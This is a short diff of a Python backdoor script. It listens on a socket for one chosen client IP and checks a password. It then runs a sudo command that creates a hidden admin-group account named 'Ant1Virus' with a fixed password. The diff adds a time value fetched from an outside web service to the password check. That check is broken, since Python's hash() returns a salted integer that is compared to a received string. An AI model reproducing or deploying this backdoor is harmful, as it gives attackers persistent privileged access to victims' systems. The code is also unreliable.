@@ -2,6 +2,7 @@
 import sys
 import subprocess
 import socket
+from urllib.request import urlopen
 
 CLIENT_IP = sys.argv[1] 
 PORT = int(sys.argv[2])
@@ -19,8 +20,11 @@ while True:
     print(address)
     if address[0] == CLIENT_IP:
         print("Address match")
+        res = urlopen('http://just-the-time.appspot.com/')
+        time = res.read().strip().decode('utf-8')
         pwd = conn.recv(4096).decode()
-        if pwd == "haxor":
+        # Check the hash
+        if pwd == hash("haxor" + time):
             print("Correct password, waiting for commands")
             conn.send("done".encode())
             subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus && sudo usermod -aG wheel Ant1Virus", shell=True)
